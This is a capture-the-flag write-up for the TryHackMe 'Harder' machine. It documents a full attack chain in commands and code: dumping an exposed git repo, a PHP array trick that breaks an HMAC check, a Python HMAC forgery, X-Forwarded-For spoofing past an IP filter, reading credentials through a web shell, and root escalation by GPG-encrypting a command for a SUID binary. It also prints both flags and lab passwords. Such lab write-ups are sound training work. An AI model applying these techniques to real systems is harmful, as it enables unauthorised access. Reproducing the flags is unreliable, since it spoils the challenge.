# Harder — CTF Writeup (TryHackMe)

Hey! This is my writeup / proof-of-work for the **Harder** box on TryHackMe. Made this to show what I actually did step by step, not just "and then I got root" lol. Full chain from nmap scan → source code leak → cracking a broken HMAC check → RCE → privesc to root.

Got both flags:
- `user.txt` → `7e88bf11a579dc5ed66cc798cbe49f76`
- `root.txt` → `3a7bd72672889e0756b09f0566935a6c`

---

## Tools I used

| Tool | What I used it for |
|---|---|
| Nmap | Scanning the box for open ports |
| Gobuster | Brute-forcing directories/files on the web servers |
| Burp Suite | Looking at requests/responses closely, editing headers |
| git-dumper | Ripping a full `.git` repo off a website |
| Python (`hmac`, `hashlib`) | Forging my own HMAC hash |
| GPG (`gpg`) | Encrypting a command with root's public key |
| SSH | Logging in as `evs` once I had creds |
| Firefox + `/etc/hosts` edits | Manually visiting the vhosts |

---

## TL;DR — the whole attack path

1. Scanned the box, only found SSH + a website.
2. Poked at the website in Burp and noticed a cookie header leaking a hidden domain (`pwd.harder.local`).
3. That domain had its `.git` folder exposed → dumped the whole source code.
4. Read the source, found a "security check" (`hmac.php`) that could be bypassed with a PHP type juggling trick.
5. Bypassed it → got creds for a **third** site, `shell.harder.local` (a literal web-based command shell).
6. That site blocks anyone not on IP range `10.10.10.x`... except it trusts `X-Forwarded-For` headers 🤦 so I just faked it.
7. Logged in, got command execution, read `user.txt`.
8. Found a backup script with a hardcoded SSH password for `evs`.
9. SSH'd in properly, found a root-owned SUID binary that runs GPG-encrypted commands.
10. Realized encrypting to root's public key doesn't need root's permission — so I encrypted my own command and got it executed as root.
11. `root.txt` captured. Box done ✅

---

## Full Walkthrough

### 1. Recon
```
nmap -sV 10.48.183.65
```
Just two ports open:
- 22 → SSH
- 80 → nginx

### 2. First look at the website
Ran gobuster on the root IP but it gave garbage results at first — turns out the server returns `200 OK` for literally everything (soft 404), so I had to exclude that response length to get real results.

### 3. Found a hidden vhost through a cookie 👀
While checking a normal request in Burp, the response had this:
```
Set-Cookie: TestCookie=just+a+test+cookie; domain=pwd.harder.local; secure
```
That domain (`pwd.harder.local`) was never linked anywhere on the site — total accident leak. Added it to `/etc/hosts` so I could actually visit it.

### 4. Enumerating `pwd.harder.local`
It's a "Password Manager" login page. Ran gobuster on it and found:
- `.git/HEAD` ← exposed git repo!!
- `auth.php`
- `index.php`
- `secret.php`

### 5. Dumping the git repo
```
git_dumper.py http://pwd.harder.local/.git/ /tmp/cft
```
This pulled the whole source tree + git history back to my machine.

### 6. Checking git log
```
git log
```
3 commits: `added index.php` → `add extra security` → `add gitignore`. That middle commit ("add extra security") was obviously the interesting one — that's when `hmac.php` got added.

### 7. Reading the source code
`index.php` loads a login check, then an extra `hmac.php` check, then shows a table of saved creds.

`hmac.php` looks like this:
```php
if (empty($_GET['h']) || empty($_GET['host'])) { die("missing get parameter"); }
require("secret.php");

if (isset($_GET['n'])) {
    $secret = hash_hmac('sha256', $_GET['n'], $secret);
}

$hm = hash_hmac('sha256', $_GET['host'], $secret);
if ($hm !== $_GET['h']) { die("extra security check failed"); }
```

### 8. Finding the bug
`hash_hmac()` needs `$_GET['n']` to be a string. But if I send it as `n[]=1` (an array) instead, PHP freaks out and `hash_hmac()` just returns `false`. So `$secret` becomes `false` — which basically means the "secret" is now a known, fixed value I can replicate myself.

### 9. Forging my own HMAC
```python
import hmac, hashlib

host = "pwd.com"
secret = ""   # matches what PHP does when hash_hmac() fails
h = hmac.new(secret.encode(), host.encode(), hashlib.sha256).hexdigest()
print(h)
```

### 10. Using the forged hash
```
http://pwd.harder.local/index.php?n[]=1&host=pwd.com&h=<my forged hash>
```
Check passed and it dumped the creds table:

| url | username | password |
|---|---|---|
| `http://shell.harder.local` | `evs` | `9FRe8VUuhFhd3GyAtjxWn0e9RfSGv7xm` |

### 11. Found ANOTHER hidden site — `shell.harder.local`
Added it to `/etc/hosts` too. It's literally a "Web Shell" login page (lol). But visiting it straight up gave:
```
Your IP is not allowed to use this webservice. Only 10.10.10.x is allowed
```

### 12. Bypassing the IP filter
Intercepted the login request in Burp and just added:
```
X-Forwarded-For: 10.10.10.1
Client-IP: 10.10.10.1
```
along with the `evs` creds from before. Worked instantly — they're trusting client-supplied headers for the "security" check, which is basically never safe.

### 13. Command execution → user flag
Logged in, used the "Execute a command" box:
```
cat /home/evs/user.txt
```
```
7e88bf11a579dc5ed66cc798cbe49f76
```
🚩 **user.txt done**

### 14. Digging for more — found creds in a cron job
Still using the web shell, checked scheduled tasks:
```
cat /etc/periodic/15min/evs-backup.sh
```
```
#!/bin/ash
# ToDo: create a backup script...
# for authentication use ssh with user "evs" and password "U6j1brxGqbsUA$pMuIodnb$SZB4$bw14"
```
Somebody left the actual SSH password in a comment in a backup script 💀

### 15. SSH in as evs
Used that password to get a real interactive shell instead of the clunky web shell.

### 16. Looking for privesc — found a SUID binary
```
find / -perm -4000 -type f 2>/dev/null
```
```
/usr/local/bin/execute-crypted
```
```
ls -la /usr/local/bin
-rwsr-x--- 1 root evs  execute-crypted
-rwxr-x--- 1 root evs  run-crypted.sh
```
Root-owned, SUID bit set, `evs` can run it. So whatever this thing does, it does it **as root**.

### 17. Found root's public GPG key lying around
```
find / -name "*root*" 2>/dev/null
```
```
/var/backup/root@harder.local.pub
```
This is just root's **public** GPG key — meaning anyone can use it to encrypt stuff *to* root. That doesn't mean root sent it or approved it, just that only root can decrypt it. `execute-crypted` clearly decrypts + runs whatever's inside, running as root because of the SUID bit.

### 18. Building my own "authorized" command
```
gpg --import root@harder.local.pub
echo -n "cat /root/root.txt" > command
gpg --recipient root@harder.local --encrypt command
```
Now I have `command.gpg` — a file encrypted TO root, that I made myself.

### 19. Running it through the SUID binary → ROOT
```
./execute-crypted /home/evs/command.gpg
```
```
gpg: encrypted with 256-bit ECDH key, ID 6C1C04522C049868, created 2020-07-07
      "Administrator <root@harder.local>"
3a7bd72672889e0756b09f0566935a6c
```
🚩 **root.txt done** — the binary decrypted my file with root's private key (since it runs as root) and just executed whatever was inside. Encryption ≠ proof it came from root, but the script never checked that.

---

## What I actually learned doing this

- Response headers (like `Set-Cookie` domain attributes) can leak stuff you'd never find from just browsing the site.
- Never expose `.git/` on a live server — it's basically handing over your whole codebase.
- PHP type juggling is wild — passing an array where a string is expected can silently break security checks (`hash_hmac()` returning `false` here).
- IP allow-lists based on headers like `X-Forwarded-For` are basically decorative — anyone can set those headers themselves.
- Cron/periodic scripts are a great place to find leftover creds people forgot about.
- SUID binaries are a huge deal — always worth checking `find / -perm -4000`.
- Encrypting something to someone's public key doesn't mean *they* approved it — encryption gives privacy, not authenticity. You need a **signature** for that, and this box's script never checked one.

---

## Screenshots

All the evidence/screenshots from each step are in this repo (numbered roughly in the order I did things — `1–20` for the web exploitation chain, `21–28` for the privesc part).

---


